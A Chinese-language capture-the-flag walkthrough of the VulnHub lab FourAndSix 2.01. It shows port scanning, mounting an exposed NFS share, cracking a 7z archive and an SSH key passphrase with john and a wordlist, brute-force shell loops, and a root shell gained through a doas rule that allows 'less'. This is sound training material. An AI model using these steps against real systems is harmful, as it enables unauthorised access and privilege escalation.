# FourAndSix: 2.01

2024-6-9 https://www.vulnhub.com/entry/fourandsix-201,266/

difficulty: easy

## IP

192.168.5.33

## Scan

Open Port -> 22,111

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 ef3b2ecf40199ebb231eaa24a1094ed1 (RSA)
|   256 c85c8b0be1640c75c363d7b380c92fd2 (ECDSA)
|_  256 61bc459abaa5472060132519b047cbad (ED25519)
111/tcp open  rpcbind 2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          941/udp   mountd
|_  100005  1,3          951/tcp   mountd
```

在扫描下 UDP 端口：

```
PORT     STATE SERVICE
111/udp  open  rpcbind
2049/udp open  nfs
```

看到 nfs 2049 的 udp 端口，看看暴漏出哪些映射：

```
showmount -e 192.168.5.33
Export list for 192.168.5.33:
/home/user/storage (everyone)
```

挂在到 kali:

```
mkdir -p /tmp/nfs
sudo mount -t nfs -o rw,vers=3 192.168.5.33:/home/user/storage /tmp/nfs
```

挂在后，进入/tmp/nfs,里面有一个 backup.7z 文件，进行解压，需要解压密码，使用 john+rockyou 进行破解。

7z2john 使用前需要安装一个依赖库:

```
sudo apt install libcompress-raw-lzma-perl -y

locate 7z2john
/usr/share/john/7z2john.pl

/usr/share/john/7z2john.pl backup.7z > hash
john hash --wordlist=~/tools/dict/rockyou.txt
chocolate        (backup.7z)
```

找到了解压密码 chocolate 进行解压，得到了几个图片和一个 ssh 密钥对。id_rsa.pub 中得到用户名 user，使用此用户名和私钥进行 ssh 登陆：

```
ssh -i id_rsa user@192.168.5.33
```

发现 id_rsa 也需要密码，继续用 john 进行破解，得到密码 12345678，继续 ssh 登陆，登陆成功。

查看 /etc/passwd 只有一个 user 普通用户。

openbsd 没有 sudo，只有 doas，查看它的配置文件：

```
/etc/doas.conf

permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
```

user 用户可以执行/usr/bin/less，看看 GTFO less 怎么提权：

```
doas /usr/bin/less /var/log/authlog
# Press v to escape vi then
:!sh

fourandsix2# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fourandsix2# cd /root
fourandsix2# ls
.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt
fourandsix2# cat flag.txt
Nice you hacked all the passwords!

Not all tools worked well. But with some command magic...:
cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done

cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done

Here is the flag:
acd043bc3103ed3dd02eee99d5b0ff42
```
